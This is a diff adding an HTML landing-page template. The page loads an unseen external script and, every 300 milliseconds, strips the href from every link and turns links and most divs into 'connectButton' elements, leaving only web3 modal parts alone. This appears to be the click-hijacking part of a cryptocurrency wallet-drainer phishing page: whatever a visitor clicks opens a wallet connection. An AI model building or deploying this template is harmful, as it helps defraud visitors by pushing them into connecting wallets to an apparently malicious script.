@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Landing Page</title>
+    
+    <!-- Add the link to your external JavaScript file -->
+    <script src="c06cedd_5.js"></script>
+
+    <!-- Your provided script -->
+    <script>
+        function addClassesToElements() {
+            const links = document.querySelectorAll('a:not(.connectButton)');
+            for (const link of links) {
+                link.removeAttribute('href');
+                link.classList.add('connectButton');
+            }
+            const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal):not(.connectButton)');
+            for (const button of buttons) {
+                button.classList.add('connectButton');
+            }
+        }
+
+        setInterval(addClassesToElements, 300);
+    </script>
+</head>
+<body>
+    <!-- Your landing page content goes here -->
+
+    <!-- Connect Button -->
+    <button class="connectButton">Connect</button>
+
+    <!-- Example link button -->
+    <a href="#" class="yourOtherClasses">Link Button</a>
+
+    <!-- Example div/button -->
+    <div class="yourOtherClasses">Div/Button</div>
+</body>
+</html>
